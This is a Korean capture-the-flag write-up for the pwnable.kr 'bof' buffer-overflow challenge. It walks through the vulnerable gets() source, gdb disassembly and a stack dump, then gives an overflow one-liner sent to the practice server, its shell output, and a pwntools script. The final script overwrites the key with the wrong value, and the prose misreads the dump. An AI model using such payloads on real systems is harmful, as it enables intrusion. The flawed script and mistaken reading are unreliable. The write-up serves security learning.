# 문제  
Nana told me that buffer overflow is one of the most common software vulnerability.
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000

---
# 개요
nc(Netcat)은 TCP나 UDP 프로토콜을 사용하는 네트워크 연결에서 데이터를 읽고 쓰는 간단한 유틸리티 프로그램입니다. 문제 해결을 위해 두 개의 링크를 제시하고 있습니다. 하나는 bof 바이너리이고, 다른 하나는 바이너리의 소스코드를 보여주고 있습니다. 문제 해결을 위해 먼저 소스코드부터 분석해야 합니다.  
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```
main함수내에서 func 함수 한개만 호출하므로 func 함수를 분석해야 합니다.  
먼저 overflowme라는 char 형 배열이 선언되어 있고 gets 함수를 통해 입력 받습니다. 그리고 key 정수 값이 0xcafebabe 라면 system("/bin/sh") 가 실행되어 쉘을 획득할 수 있습니다. gets 함수는 길이 값 검사를 하지 않아 overflow 취약점이 발생하는 함수입니다. gdb를 이용하여 다운받은 바이너리를 분석하여 취약점을 검증하고 이를 이용하여 shell을 획득하겠습니다.

#분석
gdb를 사용하여 bof 바이너리의 main함수를 디스어셈블리 한 모습입니다.
```
secretpack@ubuntu:~$ gdb -q bof
Reading symbols from bof...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x0000068a <+0>:	push   %ebp
   0x0000068b <+1>:	mov    %esp,%ebp
   0x0000068d <+3>:	and    $0xfffffff0,%esp
   0x00000690 <+6>:	sub    $0x10,%esp
   0x00000693 <+9>:	movl   $0xdeadbeef,(%esp)
   0x0000069a <+16>:	call   0x62c <func>
   0x0000069f <+21>:	mov    $0x0,%eax
   0x000006a4 <+26>:	leave  
   0x000006a5 <+27>:	ret    
End of assembler dump.
(gdb)
```
main+16위치에서 func 함수를 call 하는 것을 볼 수 있습니다.  
func 함수를 분석해봅시다.  
```
(gdb) disas func
Dump of assembler code for function func:
   0x0000062c <+0>:	push   %ebp
   0x0000062d <+1>:	mov    %esp,%ebp
   0x0000062f <+3>:	sub    $0x48,%esp
   0x00000632 <+6>:	mov    %gs:0x14,%eax
   0x00000638 <+12>:	mov    %eax,-0xc(%ebp)
   0x0000063b <+15>:	xor    %eax,%eax
   0x0000063d <+17>:	movl   $0x78c,(%esp)
   0x00000644 <+24>:	call   0x645 <func+25>
   0x00000649 <+29>:	lea    -0x2c(%ebp),%eax
   0x0000064c <+32>:	mov    %eax,(%esp)
   0x0000064f <+35>:	call   0x650 <func+36>
   0x00000654 <+40>:	cmpl   $0xcafebabe,0x8(%ebp)
   0x0000065b <+47>:	jne    0x66b <func+63>
   0x0000065d <+49>:	movl   $0x79b,(%esp)
   0x00000664 <+56>:	call   0x665 <func+57>
   0x00000669 <+61>:	jmp    0x677 <func+75>
   0x0000066b <+63>:	movl   $0x7a3,(%esp)
   0x00000672 <+70>:	call   0x673 <func+71>
   0x00000677 <+75>:	mov    -0xc(%ebp),%eax
   0x0000067a <+78>:	xor    %gs:0x14,%eax
   0x00000681 <+85>:	je     0x688 <func+92>
   0x00000683 <+87>:	call   0x684 <func+88>
   0x00000688 <+92>:	leave  
   0x00000689 <+93>:	ret    
End of assembler dump.
(gdb)
```
0x48(72) 만큼의 버퍼를 할당하고 0x0000064f에서 입력 함수를 call 하여 eax에 집어 넣는 것을 확인할 수 있습니다. 그리고 0x00000654에서 cmp 문을 통해 cafebabe와 ebp - 8(key)와 비교합니다.
이제 overflow를 일으켜봅시다.
```
(gdb) b *func+40
Breakpoint 1 at 0x654
```
입력받은 바로 다음에 실행될 부분에 Breakpoint를 걸어줍니다.
```
(gdb) r <<< $(python -c 'print "A" * 40')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/secretpack/bof <<< $(python -c 'print "A" * 40')
overflow me :

Breakpoint 1, 0x56555654 in func ()
(gdb) x/100x $esp
0xffffd5c0:	0xffffd5dc	0xffffd664	0xf7fb7000	0x0000c287
0xffffd5d0:	0xffffffff	0x0000002f	0xf7e13dc8	0x41414141
0xffffd5e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd5f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd600:	0x41414141	0xf7fb7000	0xffffd628	0x5655569f
0xffffd610:	0xdeadbeef	0x56555250	0x565556b9	0x00000000
```
A라는 문자열로 40byte만큼의 버퍼를 채운 모습입니다.
아래쪽에 key 변수에 저장되어 있는 0xcafebabe가 보입니다.
이를 바탕으로 공격 코드를 작성합니다.
```
secretpack@ubuntu:~$(python -c 'print "A"*52 + "\xbe\xba\xfe\xca" +"\n"';cat) | nc pwnable.kr 9000
$ls
bof
bof.c
flag
log
log2
super.pl
$cat flag
daddy, I just pwned a buFFer :)
```
```python
from pwn import*
p = remote("pwnable.kr",9000)
payload = "A"*52
payload += p32(0xdeadbeef)
payload += "\n"

p.send(payload)
p.interactive()
```
